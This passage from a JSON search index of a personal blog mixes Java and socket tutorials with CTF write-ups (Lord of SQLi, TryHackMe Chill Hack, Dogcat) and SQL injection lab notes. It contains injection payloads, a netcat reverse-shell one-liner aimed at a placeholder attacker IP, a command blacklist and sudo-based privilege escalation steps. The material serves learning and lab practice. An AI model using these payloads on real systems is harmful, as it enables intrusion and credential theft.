each and every on the problems I just told you about. "
    }, {
    "id": 19,
    "url": "/Find-Command/",
    "title": "Linux - Find Command : Cheat Sheet ",
    "body": "2021/01/19 - "
    }, {
    "id": 20,
    "url": "/LOS-goblin/",
    "title": "Lord Of SQLi : goblin Writeup",
    "body": "2021/01/05 -  Previous WriteUp : gremlin Provided code: &lt;?php  //Challenge Preparation include  . /config. php ;  login_chk();  $db = dbconnect();  // - - - - - -  if(preg_match('/prob|_|\. |\(\)/i', $_GET[no])) exit( No Hack ~_~ );  if(preg_match('/\'|\ |\`/i', $_GET[no])) exit( No Quotes ~_~ );  $query =  select id from prob_goblin where id='guest' and no={$_GET[no]} ;  echo  &lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt; ;  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if($result['id']) echo  &lt;h2&gt;Hello {$result[id]}&lt;/h2&gt; ;  if($result['id'] == 'admin') solve( goblin ); highlight_file(__FILE__); ?&gt;Explanation: -&gt; Challenge preparationFirst of all, it includes this php file called config. php, then it checks if you are logged in or not. After that, it connect to the database. -&gt; no field check There’s a double check for the no field, firstly it checks for : -&gt; First REGEX explanation/prob|_|. |()/i1st Alternative probprob matches the characters prob literally (case insensitive)2nd Alternative __ matches the character _ literally (case insensitive)3rd Alternative . . matches the character . literally (case insensitive)4th Alternative ()( matches the character ( literally (case insensitive)) matches the character ) literally (case insensitive)Global pattern flagsi modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z]) -&gt; Second REGEX explanation/'| |`/i1st Alternative '' matches the character ‘ literally (case insensitive)2nd Alternative    matches the character “ literally (case insensitive)3rd Alternative `` matches the character ` literally (case insensitive)Global pattern flagsi modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z]) Then it executes the final query, and if result id == admin then the problem is solved, else, it returns “Hello {$result[id]}” Solution: As mentioned before, we can’t use quotes, but we can use another methods like : SUBSTR(): The SUBSTR() function extracts a substring from a string (starting at any position). The main idea is that we extract the first character of the id field that matches if it equals 97 (ASCII character of ‘a’). -&gt; Payload : /?no=0 or ascii(substr(id,1,1))=97 ORDER BY: If we use this function, SQL will sort data by column according to asc. -&gt; Payload : /?no=2 or 1 order by id LIMIT 1,1: This function will cut the rows from offset-index to (offset+amount)-index. Start of index is 0,0. -&gt; Payload : /?no=0 or 1 limit 1,1 Resources : PortSwigger - Bypassing Common filters "
    }, {
    "id": 21,
    "url": "/LOS-gremlin/",
    "title": "Lord Of SQLi : gremlin Writeup",
    "body": "2021/01/03 -  Resources : SQL INJECTION - Introduction Introduction: ‘Lord of SQL Injection’, a site where you can learn about SQL injection vulnerabilities while capturing dungeons. LoS provides 49 stepwise SQLinjection challenges. Challenges are about SQLinjection at mysql, sqlite, mssql, mongodb, webapp what protected by WAF.  Site origin Country : Korea Language : EnglishGremlin: Given a php code : &lt;?php include  . /config. php ; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\. |\(\)/i', $_GET[id])) exit( No Hack ~_~ ); // do not try to attack another table, database! if(preg_match('/prob|_|\. |\(\)/i', $_GET[pw])) exit( No Hack ~_~ ); $query =  select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}' ; echo  &lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt; ; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id']) solve( gremlin ); highlight_file(__FILE__);?&gt; Explanation: -&gt; Challenge preparationFirst of all, it includes this php file called config. php, then it checks if you are logged in or not. After that, it connect to the database. -&gt; The fun beginspreg_match is a php function that performs a regular expression match. If the provided regex found in the id or pw fields it exits with “No Hack ~_~” message? -&gt; REGEX explanation/prob|_|. |()/i1st Alternative probprob matches the characters prob literally (case insensitive)2nd Alternative __ matches the character _ literally (case insensitive)3rd Alternative . . matches the character . literally (case insensitive)4th Alternative ()( matches the character ( literally (case insensitive)) matches the character ) literally (case insensitive)Global pattern flagsi modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z]) Then, with the provided id and pw, the SQL query is ready to be executed, and it is printed out using the following echo. Using the mysqli_fetch_array function, which fetch a result row as an associative, a numeric array, or both. Finally, it checks if the id has a value, if it has, the challenge is solved ! I just want to mention that the id and pw field are gonna be passed in the url like this : ?id=If you’ve read my article mentioned above, you can solve this challenge easily by closing the id field using an apostrophe then executing a condition that returns true as a result like 1=1. So the final result will be : ?id=’ OR 1=1 Then we need to comment out the pw field so we insert a double dash followed by a space (Black Space = %20 : URL encoding) or a hashtag(hashtag = %23 : URL encoding )?id=’ OR 1=1 –%20So the final query will be : select id from prob_gremlin where id='' OR 1=1 -- ' and pw=''GREMLIN CLEAR ! "
    }, {
    "id": 22,
    "url": "/control-statements/",
    "title": "Java - OOP Concepts",
    "body": "2020/12/28 - Basically, the Java control statements are the same as in C language. if-else statement: public class Java_Nested_if{  public static void main(String[] args){    int age = 25;     int weight = 48;     if (age&gt;=18){      if (weight&gt;50){        System. out. println( You can donate blood );      }      else{        System. out. println( Go eat some fucking food );      }    else{      System. out. println( Sorry lil boy, go play with your toys );    }    }  }}Switch statement: The switch statement tests the equality of a variable against multiple values. Rules :  There can be one or N number of case values for a switch expression.  The case value must be of switch expression type only. The case value must be literal or constant. It doesn”t allow variables.  The case values must be unique. In case of duplicate value, it renders compile-time error.  Switch statement example:```java public class SwitchExample2{  public static void main(String[] args){   int number = 20;   switch(number){    case 10 : System. out. println( 10 );    case 20: System. out. println( 20 );    case 30 : System. out. println( 30 );    default : System. out. println( Not in 10, 20,30 );  }} }``` "
    }, {
    "id": 23,
    "url": "/Java-Variables/",
    "title": "Java - Variables",
    "body": "2020/12/28 - Java Variables: A variable is a container which holds the value while the Java Program is executed. A variable is assigned with a data type. Variable is a name of memory location. There are three types of variables in java: local, instance and static. There are two types of data types in Java: primitive and non-primitive.  Local VariableA variable declared inside the body of the method is called local variable. You can use this variable only within that method and the other methods in the class aren’t even aware that the variable exists. A local variable cannot be defined with static keyword.  Instance VariableA variable declared inside the class but outside the body of the method, is called instance variable. It is not declared as static. It is called instance variable because its value is instance specific and is not shared among instances.  Static VariableA variable which is declared as static is called static variable. It cannot be local. You can create a single copy of static variable and share among all the instances of the class . Memory allocation for static variable happens only once when the class is loaded in the memory. Example to understand the types of variables in Java: class A {  int data=50; //instance variable  static int m=100; // static variable  void method(){    int n=90; //local variable  }} //end of classJava Variable Example : Add Two Numbersclass Simple{  public static void main(String[] args){    int a=10; //a is an instance variable    int b=10; //b is an instance variable    int c=a+b;     System. out. println(c);  }  }Output : 20Java Variable Example : Wideningclass Simple{  public static void main(String[] args){    int a=10;     float f=a;    System. out. println(a);    System. out. println(f);      }}Output : 1010. 0Java Variable Example: Narrowing (Typecasting): class simple{  public static void main(String[] args){    float f=10. 5f; //f is placed after value because by default value is double, so to tell the compiler to treat is as float explicitly we use f or F    int a=f; // This will give a runtime error    int a = (int)f; // This is typecasting    System. out. println(f);     System. out. println(a);   }}Output : 10. 510Java Variable Example : Overflow: Overflow occurs when we assign such a value to a variable which is more than the maximum permissible value. class Simple{  public static void main(String[] args){    //Overflow    int a=130;     byte b = (byte)a; //Max Value of byte is 126     System. out. println(a);    System. out. println(b);  }}Output : 130-126Java Variable Example : Adding Lower Type: ```javaclass Simple{  public static void main(String[] args){    byte a = 10;     byte b = 10;     byte c = a+b; // Compile Time Error : because a+b will be int     byte c = (byte)(a+b);    System. out. println(c);  }} Output :20 "
    }, {
    "id": 24,
    "url": "/JVM-architecture/",
    "title": "Java - JVM Architecture",
    "body": "2020/12/28 - JVM contains classloader, memory area, execution engine etc.  Classloader: Classloader is a subsystem of JVM which is used to load class files. Whenever we run the java program, it is loaded first by the classloader. There are three built-in classloaders in Java.    Bootstrap Class Loader: This is the first classloader which is the super class of Extension classloader. It loads the rt. jar file which contains all class files of Java Standard Edition like java. lang package classes, java. net package classes, java. util package classes. java. io package classes, java. sql package classes etc.     Extension ClassLoader: This is the child classloader of Bootstrap and parent classloader of System classloader. It loader the jar files located inside $JAVA_HOME/jre/lib/ext directory.     System/Application ClassLoader: This is the child classloader of Extension classloader. It loads the classfiles from classpath. By default, classpath is set to current directory. You can change the classpath using ‘-cp’ or ‘-classpath’ switch. It is also know as Application classloader.     Class(Method) AreaClass(Method) Area stores per-class structures such as the runtime constant pool, field and method data, the code for methods.     HeapIt is the runtime data area in which objects are allocated.     StackJava Stack stores frames. It holds local variables and partial results, and plays a part in method invocation and return. Each thread has a private JVM stack, created at the same time as thread. A new frame is created each time a method in invoked. A frame is destroyed when its method invocation completes.     Program Counter RegisterPC (program counter) register contains the address of the Java virtual machine instruction currently being executed.     Native Method StackIt contains all the native methods used in the application.   Execution EngineIt contains: A virtual processor Interpreter : Read bytecode stream then execute the instructions.    Just-In-Time(JIT) compiler: It is used to improve the performance. JIT compiles parts of the byte code that have similar functionality at the same time, and hence reduces the amount of time needed for compilation. Here, the term “compiler” refers to a translator from the instruction set of a JVM to the instruction set of a specific CPU.   Java Native InterfaceJava Native Interface (JNI) is a framework which provides an interface to communicate with another application written in another language like C, C++, Assembly etc. Java uses JNI framework to send output to the Console or interact with OS libraries. Resources : https://www. javatpoint. com/jvm-java-virtual-machine "
    }, {
    "id": 25,
    "url": "/First-Java-program/",
    "title": "Java - Clickable Pen program",
    "body": "2020/12/28 - Following Alex Lee video about object oriented programming, I wrote this basic OOP program which create a pen as an object and two methods that click and unclick the pen.  The source can be found in my github directory : JAVA - OOP "
    }, {
    "id": 26,
    "url": "/Difference-between-JDK,-JRE-and-JVM/",
    "title": "Java - JDK, JRE and JVM",
    "body": "2020/12/28 - Notes: JVM, JRE, and JDK are platform dependent because the configuration of each OS is different from each other. However Java is platform independent. JVM: JVM (Java Virtual Machine) is an abstract machine. It is a specification that provides a runtime environment in Which Java bytecode can be executed. It can also run those programs which are written in other languages and compiled to Java bytecode. JVMs are availbale for many hardware and software platforms. The JVM performs the following main tasks :  Loads code Verifies code Executes code Provides runtime environmentJRE: JRE (Java Runtime Environment) is a set of software tools which are used for developing Java applications. It is used to provide the runtime environment. It contains a set of libraries + other files that JVM uses at runtime. JDK: JDK is an acronym for Java Development Kit. The Java Development Kit is a software development environment which is used to develop Java applications and applets. It physically exists. It contains JRE + development tools. Resources : https://www. javatpoint. com/difference-between-jdk-jre-and-jvm "
    }, {
    "id": 27,
    "url": "/Data-Types/",
    "title": "Java - Data Types",
    "body": "2020/12/28 - Java is statically-typed programming language. Data types specify the different sizes and values that be stored in the variable. There are two types of data types in Java : Java Primitive Data Types: There are 8 types of primitive data types :  boolean false byte 0               char ‘\u0000’     Java uses 2 byte because it uses Unicode system instead of ASCII code system and the \u0000 is the lowest range of unicode system.            short 0 int 0 long 0L float 0. 0f double 0. 0dJava Operators: There are many types of operators in Java which are given below :                Unary Operator (expr++ / expr–     ++expr / –expr     ~(bitwise complement) !)           Arithmetic Operator (* / % + -) Shift (The Java left shift operator « is used to shift all of the bits in a value to the left side of a specified number of times. ) Relational (Comparison &amp; equality)               Bitwise (&amp; ^     )           Logical (AND, OR) Ternary ( ? : ) Assignment (short + short = int : Compile Time Error -&gt; Solution : TypeCasting)Unicode System: Unicode is a universal international standard character encoding that is capable of representing most the world’s written languages. Why java uses Unicode system ?Before Unicode, there were many language standards:  ASCII (American Standard Code for Information Interchange) for the United States.  ISO 8859-1 for Western European Language.  KOI-8 for Russian.  GB18030 and BIG-5 for chinese. This caused two major problems which is :  A particular code value corresponds to different letters in the various language standards.  The encodings for languages with large character sets have variable length. Some common characters are encoded as single bytes, other require two or more byte. The solution for those problems is the Unicode System. The lowest value : \u0000The highest value : \uFFFF Resources : https://www. javatpoint. com/java-data-types "
    }, {
    "id": 28,
    "url": "/THM-Chill-Hack/",
    "title": "TryHackMe: Chill Hack WriteUp - PART 1",
    "body": "2020/12/18 - Enumeration: Classic Nmap scan : PORT  STATE SERVICE VERSION21/tcp open ftp   vsftpd 3. 0. 322/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)|  256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)|_ 256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)First things first, I start enumerating the FTP port wishing that it accepts anonymous login: ftp 10. 10. 146. 220Connected to 10. 10. 146. 220. 220 (vsFTPd 3. 0. 3)Name (10. 10. 146. 220:root): anonymous331 Please specify the password. Password:230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls -al200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x  2 0    115     4096 Oct 03 04:33 . drwxr-xr-x  2 0    115     4096 Oct 03 04:33 . . -rw-r--r--  1 1001   1001      90 Oct 03 04:33 note. txt226 Directory send OK. ftp&gt; get note. txtlocal: note. txt remote: note. txt200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note. txt (90 bytes). 226 Transfer complete. 90 bytes received in 0. 00 secs (703. 1249 kB/s)As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a note. txt file. I download it using the get command.  Anurodh told me that there is some filtering on strings being put in the command – Apaar Well, that sounds cool, we got a hint, there’s some filtration out there for strings. (Hope that it’s not a rabbit hole), and we got 2 usernames. (We can start a bruteforce attack using hydra on the ssh but not for now, we need some more enumeration). Let’s move on for the HTTP server:Nothing too fancy here, just some random theme running. So I ran gobuster for some directory searching. After some minutes of directory bruteforcing here’s the result : root@kali:~/Documents/thm/game_info# gobuster dir -u http://10. 10. 146. 220/ -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt -t 200 2&gt;/dev/null ===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 146. 220/[+] Threads:    200[+] Wordlist:    /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Timeout:    10s===============================================================2020/12/18 07:29:47 Starting gobuster===============================================================/images (Status: 301)/css (Status: 301)/js (Status: 301)/fonts (Status: 301)/secret (Status: 301)Well, as it’s in easy level, that was kinda expected. There’s a /secret directory. Let’s check it inside our browser : Hmm, a field expecting a command and an execute button, with a silly animation ! Let’s execute an ls command and see what happens ? So, there’s some filtration for some commands like ls. I tried cat, python and nc commands but they’re all filtered. I tried to split the commands with a semicolon but nothing changed. So my final thought is that it filters some the string entered as an input. My first idea is to try a reverse shell found in highon coffee blog : mkfifo /tmp/lol;nc ATTACKER-IP PORT 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lolLooking at the index. php file found in the /var/www/html/secret directory, I found that my guessing was true, there’s a blacklist array which contains some commands that are gonna filtered later. $cmd = $_POST['command'];$store = explode(   ,$cmd);$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');Let’s spawn a tty shell and move on. Looking at the home directory, I found that there’s a directory called apaar (remember the hint ?). After checking it, I found a local. txt file which I don’t have permission to read and a . helpline. sh file which can be run as apaar (after checking sudo -l) User www-data may run the following commands on ubuntu:  (apaar : ALL) NOPASSWD: /home/apaar/. helpline. shReading the code, it looks like it executes whatever we type and redirects the error the /dev/null, so I executed /bin/bash to get a shell from the user apaar and run any command we want ! www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/. helpline. shsudo -u apaar /home/apaar/. helpline. shWelcome to helpdesk. Feel free to talk to anyone at any time!Enter the person whom you want to talk with: seifseifHello user! I am seif, Please enter your message: /bin/bash/bin/bashlslslocal. txtwhoamiwhoamiapaarcat local. txtcat local. txt{USER-FLAG: REDACTED-REDACTED-REDACTED}Bingo ! We got the first flag "
    }, {
    "id": 29,
    "url": "/Socket-Functions/",
    "title": "Socket Functions",
    "body": "2020/12/14 - In C, sockets behavee a lot like files since they use file descriptors to identify themselves. Sockets behave a lot like files that you can actually use the read() and write() functions to receive and send data using socket file descriptors. However, there are several functions specifically designed for dealing with sockets. socket(int domain, int type, int protocol): Used to create a new socket, returns a file descriptor for the socket or -1 on error. connect(int fd, struct sockaddr *remote_host, socklen_t add_length): Connects a socket (described by file descriptor fd) to a remote host. Returns 0 on success and -1 on error. bind(int fd, struct sockaddr *local_addr, socklen_t addr_length): Binds a socket to a local address so it can listen for incoming connections. Returns 0 on success and -1 on error. listen(int fd, int backlog_queue_size): Listens for incoming connections and queues connection requests up to backlog_queue_size. Returns 0 on success and -1 or error. accept(int fd, sockaddr *remote_host, socklen_t *addr_length): Accepts an incoming connection on a bound socket. The address information from the remote host is written into the remote_host structure and the actual size of the address structure is written into *addr_length. This function returns a new socket file descriptor to identify the connected socket or -1 on error. send(int fd, void *buffer, size_t n, int flags): Sends n bytes from *buffer to socket fd; returns the number of bytes or -1 on error. recv(int fd, void *buffer, size_t n, int flags): Receives n bytes from socket fd into *buffer; returns the number of bytes received or -1 on error. When a socket is created with the socket() function, the domain, type, and protocol of the socket must be specified. The domain refers to the protocol family of the socket. A socket can be used to communicate using a variety of protocol, from the standard Internet protocol used when you browse the Web to amateur radio protocols such as AX. 25 These are the first 11 protocol families aka domain taken from : /usr/include/x86_64-linux-gnu/bits /* Protocol families.  /#define PF_UNSPEC    0    / Unspecified.  /#define PF_LOCAL    1    / Local to host (pipes and file-domain).  /#define PF_UNIX     PF_LOCAL / POSIX name for PF_LOCAL.  /#define PF_FILE     PF_LOCAL / Another non-standard name for PF_LOCAL.  /#define PF_INET     2    / IP protocol family.  /#define PF_AX25     3    / Amateur Radio AX. 25.  /#define PF_IPX     4    / Novell Internet Protocol.  /#define PF_APPLETALK  5    / Appletalk DDP.  /#define PF_NETROM    6    / Amateur radio NetROM.  /#define PF_BRIDGE    7    / Multiprotocol bridge.  /#define PF_ATMPVC    8    / ATM PVCs.  /#define PF_X25     9    / Reserved for X. 25 project.  /#define PF_INET6    10   / IP version 6.  /#define PF_ROSE     11   / Amateur Radio X. 25 PLP.  */ As mentioned before, there are several types of sockets, although stream sockets and datagram socket are the most commonly used. The types of sockets are defined in socket_type. h file in the same directory (/usr/include/x86_64-linux-gnu/bits).  Note : File locations may vary over systems. /* Types of sockets.  /enum __socket_type{ SOCK_STREAM = 1,       / Sequenced, reliable, connection-based                  byte streams.  /#define SOCK_STREAM SOCK_STREAM SOCK_DGRAM = 2,        / Connectionless, unreliable datagrams                  of fixed maximum length.  */ The final argument for the socket() function is the protocol, which should almost always be 0. The specification allows for multiple protocols within a protocol family, so this argument is used to select one of the protocols from the family. In practice however, most protocol families only have one protocol which means this should usually be set for 0. "
    }, {
    "id": 30,
    "url": "/What-are-sockets/",
    "title": "What are Sockets ?",
    "body": "2020/12/13 - What are Sockets ?: A socket is a standard way to perform network communication through the OS. A socket can be thought of as an endpoint to a connection. Sockets are just a programmer’s abstraction that takes care of all the nitty-gritty details of the OSI model described above. To the programmer, a socket can be used to send or receive data over a network. This data is transmitted at the session layer, above the lower layers (handled by the operating system) which take care of the routing. There are several different types of sockets that determine the stricture of the transport layer. The most common types are stream sockets and datagram sockets. Stream Sockets: Stream sockets provide reliable two-way communication similar to when you call someone on the phone. One side initiates the connection to the other, and after the connection is established, either side can communicate to the other. In addiction, there is immediate confirmation that what you said actually reached its destination. Stream sockets use a standard communication protocol called Transmission Control Protocol(TCP), which exists on the transport layer (4) of the OSI model. On computer networks, data is usually transmitted in chunks called packets. TCP is designed so that the packets of data will arrive without errors and is sequence, like words arriving at the other end in the order where they were spoken when you are talking on the telephone. Web servers, mail servers, and their respective client applications all use TCP and stream sockets to communicate. Datagram socket: Another common type of socket is a datagram socket. Communicating with a datagram socket is more like mailing a letter than making a phone call. The connection is one-way only and unreliable. If you mail several letters, you can’t be sure that they arrived in the same order, or even that they reached their destination at all. Stream sockets use TCP protocol, however Datagram sockets use another standard protocol called UDP (User Datagram Protocol). This protocol is very basic and lightweight, with few safeguards built into it. It’s not a real connection, just a basic method for sending data from one point to another. With datagram sockets, there is very little overhead in the protocol, but the protocol doesn’t do much. If your program needs to confirm that a packet was received by the other side, the other side must be coded to send back an acknowledgement packet. In some cases packet loss is acceptable. Datagram sockets and UDP are commonly used in networked games and streaming media, since developers can tailor their communications exactly as needed without the built-in overhead of TCP. "
    }, {
    "id": 31,
    "url": "/SQLi-Hidden-data/",
    "title": "SQLi - Retrieving Hidden Data",
    "body": "2020/11/27 -  Lab : Retrieving hidden data Let’s take this SQL query as an example : SELECT * FROM products WHERE category = 'Gifts' AND released = 1 This SQL query asks the database to return:  all details from the products table where the category is Gifts and released is 1The restriction released = 1 is being used to hide products that are not released. For unreleased products, presumably released = 0. The application doesn’t implement any defenses against SQL injection attacks (like input validation, parametrized queries, etc…), so an attacker can construct an attack like : SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 The key thing here is that the double-dash sequence – is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes AND released = 1. This means taht all products are displayed, including unreleased products. Going further, an attacker can cause the application to display all the products in any category, including categories that they don’t know about, by submitting this url : https://insecure-website. com/products?category=Gifts’+OR+1=1– This results in the SQL query: SELECT * FROM products WHERE category = 'Gifts' OR 1=1' -- AND released = 1The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since 1=1 is always true, the query will return all items. "
    }, {
    "id": 32,
    "url": "/SQL-Injection/",
    "title": "SQLi - SQL Injection",
    "body": "2020/11/24 -  What is SQL injection: SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application content or behavior. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. Results of a successful SQL injection attack: The attacker can access to sensitive data (passwords, credit card details, personal information …) Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization’s systems, leading to a long-term compromise that can go unnoticed for an extended period. SQL injection examples: There are a wide variety of SQL injection vulnerabilities, attacks and techniques, which arise in different situations. Some common SQL injection examples include:    Retrieving hidden data: where you can modify an SQL query to return additional results.     Subverting application logic: where you can change a query to interfere with the application’s logic.      Lab : Subverting application logicConsider an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks he credentials by performing the following SQL query:    SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'    If the query returns the details of a user, then the login is successful, otherwise, it’s rejected.    Here, an attacker can log in as any user without a password simply by using the SQL comment sequence – to remove the password check from the WHERE clause of the query. For example, submitting the username *administrator’– and a blank password results in the following query: SELECT * FROM users WHERE username = 'administrator'--'AND password = ''This query returns the user whose username is administrator and successfully logs th attacker in as that user.  Union attacks: where you can retrieve data from different database tables. In cases where the results of an SQL query are returned within the application’s responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database. This is done using the UNION keyword, which lets you execute an additional SELECT query and append the results to the original query. For example, if an application executes the following query containing the user input “Gifts”: SELECT name, description FROM products WHERE category = 'Gifts'then an attacker can submit the input:‘ UNION SELECT username, password FROM users–This will cause the application to return all usernames and passwords along with the names and descriptions of products. To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:  How many columns are being returned from the original query ? Which columns returned from the original query are of a suitable data type to hold the results from the injected query ? Determining the number of columns required in an SQL injection UNION attack : First of all, you can inject a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quotes string within the WHERE clause of the original query, you would submit: ‘ ORDER BY 1–‘ ORDER BY 2–‘ ORDER BY 3–‘ ORDER BY 4–Until the database returns an error such as :The ORDER BY position number 3 is out of range of items in the select list. The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:‘ UNION SELECT NULL–‘ UNION SELECT NULL,NULL–‘ UNION SELECT NULL,NULL,NULL–etc. If the number of nulls does not match the number of columns, the database returns an error such as:All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists. Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application’s code. If you are lucky, you will see some additional content within the response, such as an extra row on a HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective. Why using NULL ?: The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct. Oracle Syntax: On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle Called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like : ‘ UNION SELECT NULL FROM DUAL– Comments: The payloads described use the double-dash comment sequence – to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # cna be used to identify a comment. "
    }, {
    "id": 33,
    "url": "/Java-OOP-concepts/",
    "title": "Java - OOP Concepts",
    "body": "2020/11/15 - Introduction: The main aim of object-oriented programming is to implement real-world entities, for example, object, classes, abstraction, inheritance, polymorphism, etc. Before you read my article, I totally recommend you this Youtube video which really explains Java OOP in 10 minutes ! Object Oriented Programming System: Object means a real-world entity such as a pen, chair, table, computer, watch, etc. Object-Oriented Programming is a methodology or paradigm to design a program using classes and objects. It simplifies software development and maintenance by providing some concepts:  Object : Any entity that has state and behavior is known as an object. An object can be defined as an instance of a class. An object contains an address and takes up some space in memory. Objects can communicate without knowing the details of each other’s data or code. The only necessary thing is the type of message accepted and the type of response returned by the objects.    Class : Collection of objects is called class. It is a logical entity. A class can also be defined as a blueprint. Class doesn’t consume any space.     Inheritance : When one object acquires all the properties and behaviors of a parent object, it is known as inheritance. It provides code reusability. It is used to achieve runtime polymorphism.     Polymorphism : If one task is performed in different ways, it is known as polymorphism.  In Java, we use method overloading and method overriding to achieve polymorphism.  Abstraction : Hiding internal details and showing functionality is known as abstraction. In Java, we use abstract class and interface to achieve abstraction.  Encapsulation : Wrapping code and data together into a single unit are known as encapsulation. A Java class is the example of encapsulation. Java bean is the fully encapsulated class because all the data members are private there.    Coupling : Coupling refers to the knowledge or information or dependency of another class. It arises when classes are aware of each other. If a class has the details information of another class, there is strong coupling. In Java, we use private, protected, and public modifiers to display the visibility level of a class, method, and field. You can use interfaces for the weaker coupling because there is no concrete implementation.     Cohesion : Cohesion refers to the level of a component which performs a single well-defined task. A single well defined task is one by a highly cohesive method. The weakly cohesive method will split the task into separate parts. The java. io package is a highly cohesive package because it has I/O related classes and interface. However, the java. util package is weakly cohesive package because it has unrelated classes and interfaces.   Association : Association represents the relationship between the objects.      One to One   One to Many   Many to One   Many to May Association can be unidirectional or bidirectional.       Aggregation : Aggregation is a way to achieve Association. Aggregation represents the relationship where one object contains other objects as a part of its state. It represents the weak relationship between objects. It is also termed as has-a relationship in Java. Like, inheritance represents the is-a relationship. It is another way to reuse objects.   Composition : The composition is also a way to achieve Association. The composition represents the relationship where one object contains other objects as a part of its state. There is a strong relationship between the containing object and the dependant object. It is the state where containing objects do not have an independent existence. If you delete the parent object, all the child objects will be deleted automatically. "
    }, {
    "id": 34,
    "url": "/THM-dogcat/",
    "title": "TryHackMe: Dogcat WriteUp",
    "body": "2020/11/14 - Link : dogcat room Welcome, Welcome, Welcome and welcome ! Introduction: After finishing lfi basics room, and learning some new lfi stuff, I chose this room to practice my new skill, and I absolutely recommend it! Enumeration: PORT  STATE SERVICE REASON     VERSION22/tcp open ssh   syn-ack ttl 61 OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H|  256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=|  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I80/tcp open http  syn-ack ttl 60 Apache httpd 2. 4. 38 ((Debian))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2. 4. 38 